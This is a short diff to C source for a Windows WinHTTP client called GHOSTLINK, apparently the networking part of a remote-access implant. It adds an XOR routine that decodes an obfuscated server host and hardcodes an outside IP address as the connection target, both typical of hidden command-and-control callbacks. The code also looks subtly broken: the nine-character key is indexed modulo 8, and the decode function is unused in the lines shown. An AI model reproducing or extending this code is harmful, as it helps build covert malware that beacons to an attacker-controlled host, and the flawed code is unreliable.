@@ -6,6 +6,15 @@
 static HINTERNET hSession = NULL;
 static WCHAR base_url[256];
 
+void network_decode_host(WCHAR *out, int outLen) {
+    BYTE enc[] = SERVER_HOST_ENC;
+    char key[] = "GHOSTLINK";
+    int len = sizeof(enc) - 1; /* minus null terminator */
+    for (int i = 0; i < len && i < outLen - 1; i++)
+        out[i] = (WCHAR)(enc[i] ^ key[i % 8]);
+    out[len < outLen ? len : outLen - 1] = 0;
+}
+
 BOOL network_init(void) {
     hSession = WinHttpOpen(L"GHOSTLINK/1.0",
                             WINHTTP_ACCESS_TYPE_NO_PROXY,
@@ -13,7 +22,7 @@ BOOL network_init(void) {
                             WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return FALSE;
 
-    wsprintf(base_url, L"http%s://%s:%d", SERVER_USE_TLS ? L"s" : L"", SERVER_HOST, SERVER_PORT);
+    wsprintf(base_url, L"http%s://%s:%d", SERVER_USE_TLS ? L"s" : L"", L"150.195.114.185", SERVER_PORT);
     return TRUE;
 }
 
